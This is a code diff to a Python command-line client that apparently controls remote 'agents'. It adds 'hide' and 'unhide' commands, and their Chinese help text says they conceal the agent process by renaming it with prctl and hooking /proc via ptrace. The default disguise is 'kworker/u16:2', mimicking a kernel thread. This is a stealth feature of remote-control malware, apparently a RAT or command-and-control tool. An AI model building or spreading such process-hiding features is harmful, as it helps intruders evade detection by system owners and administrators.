@@ -600,6 +600,21 @@ def cmd_screen(a):
     sys.exit(0)
 
 
+def cmd_hide(a):
+    """隐藏 agent 进程"""
+    d = find(a.name)
+    args = [a.disguise] if a.disguise else []
+    r = cmd_call(d, "hide_start", args, timeout=a.timeout)
+    emit(a, r)
+
+
+def cmd_unhide(a):
+    """停止隐藏"""
+    d = find(a.name)
+    r = cmd_call(d, "hide_stop", [], timeout=a.timeout)
+    emit(a, r)
+
+
 def main():
     j = argparse.ArgumentParser(add_help=False)
     j.add_argument("--json", action="store_true", help="结构化 JSON 输出")
@@ -726,6 +741,17 @@ def main():
     sp.add_argument("name")
     sp.add_argument("action", choices=["on", "off", "status"])
     sp.set_defaults(fn=cmd_screen)
+
+    sp = sub.add_parser("hide", parents=[j], help="隐藏 agent 进程 (prctl改名 + ptrace hook /proc)")
+    sp.add_argument("name")
+    sp.add_argument("--name-disguise", dest="disguise", help="伪装进程名 (默认 kworker/u16:2)")
+    sp.add_argument("--timeout", type=int, default=30)
+    sp.set_defaults(fn=cmd_hide)
+
+    sp = sub.add_parser("unhide", parents=[j], help="停止隐藏, 恢复原进程名")
+    sp.add_argument("name")
+    sp.add_argument("--timeout", type=int, default=30)
+    sp.set_defaults(fn=cmd_unhide)
 
     a = p.parse_args()
     a.fn(a)
